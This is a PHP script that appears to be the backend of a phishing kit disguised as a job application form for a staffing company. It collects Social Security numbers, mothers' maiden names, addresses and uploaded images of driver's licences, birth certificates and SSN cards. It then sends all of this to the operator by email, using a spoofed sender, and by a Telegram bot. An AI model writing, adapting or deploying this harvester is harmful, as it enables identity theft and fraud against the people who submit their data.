<?php

include "req.php";
 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve and sanitize form data
    function sanitize_input($data) {
        return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
    }
    
    $firstName = sanitize_input($_POST['first-name'] ?? '');
    $lastName = sanitize_input($_POST['last-name'] ?? '');
    $mothersMaidenName = sanitize_input($_POST['mothers-maiden-name'] ?? '');
    $emailAddress = sanitize_input($_POST['email-address'] ?? '');
    $socialSecurityNumber = sanitize_input($_POST['social-security-number'] ?? '');
    $currentHomeAddress = sanitize_input($_POST['current-home-address'] ?? '');
    $phoneNumber = sanitize_input($_POST['phone-number'] ?? '');

    // Check required fields
    if (!$firstName || !$lastName || !$mothersMaidenName || !$emailAddress || !$socialSecurityNumber || !$currentHomeAddress || !$phoneNumber) {
        die(json_encode(['alert' => 'error', 'message' => 'All required fields must be filled out.']));
    }

    // Create a unique directory for each form submission
    $id = time(); // Using a timestamp as a unique identifier for the folder
    $storeFolder = "../media/" . $id . "/";
    if (!is_dir($storeFolder) && !mkdir($storeFolder, 0755, true)) {
        echo json_encode(['alert' => 'error', 'message' => 'Failed to create upload directory.']);
        exit;
    }

    // Define file extensions allowed
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'pdf', 'doc', 'docx'];
    $fileUrls = []; // Store URLs of uploaded files

    // Handle each file upload and validate the extension
    $fileFields = [
        'drivers-license-front' => "Driver's License Front",
        'drivers-license-back' => "Driver's License Back",
        'birth-certificate' => "Birth Certificate",
        'ssn-card-front' => "SSN Card Front",
        'ssn-card-back' => "SSN Card Back"
    ];

    foreach ($fileFields as $field => $label) {
        if (isset($_FILES[$field]) && $_FILES[$field]['error'] === UPLOAD_ERR_OK) {
            $extension = strtolower(pathinfo($_FILES[$field]['name'], PATHINFO_EXTENSION));
            if (in_array($extension, $allowedExtensions)) {
                $uniqueFileName = $field . '_' . mt_rand(10000, 99999) . date("d") . date("m") . date("Y") . '.' . $extension;
                $filePath = $storeFolder . $uniqueFileName;
                if (move_uploaded_file($_FILES[$field]['tmp_name'], $filePath)) {
                    $fileUrls[$label] = "../media/$id/" . $uniqueFileName;
                } else {
                    echo json_encode(['alert' => 'error', 'message' => "Failed to move $label."]);
                    exit;
                }
            } else {
                echo json_encode(['alert' => 'error', 'message' => "Invalid file extension for $label."]);
                exit;
            }
        }
    }

    // Continue with PHPMailer configuration to send email
    
    $mail = "++ -------======------ Form Submission Details ------======------ ++
+++++++++++++++++++++++++++++++++++++++++++++++++
+ First Name:  $firstName
+ Last Name: $lastName 
+ Mother's Maiden Name: $mothersMaidenName
+ Email Address: $emailAddress
+ Social Security Number: $socialSecurityNumber
+ Current Home Address: $currentHomeAddress
+ Phone Number: $phoneNumber
+ \n";

    if (!empty($fileUrls)) {
        $mail .= "++++++++++++++++++++++++++++++++++++++++\n";
        $mail .= "++ ------------ Uploaded Files  ------------ ++\n";
        $mail .= "++++++++++++++++++++++++++++++++++++++++";
        foreach ($fileUrls as $label => $url) {
           $mail .= "\n+ $label: ".getFullFileUrl($url);
        }
    }
	
	$headers = "From:$emailAddress <info@himjobstaffing.com>\r\nX-Mailer: PHP/". phpversion();
	$subj = "New Form Submission"; 
    mail($to, $subj, $mail, $headers);

    $mess =urlencode($mail);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$chatid ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl); 

    echo json_encode(["alert" => "success", "message" => "Form submitted successfully and email sent."]);
} else {
    echo json_encode(['alert' => 'error', 'message' => 'Bad Request']);
}
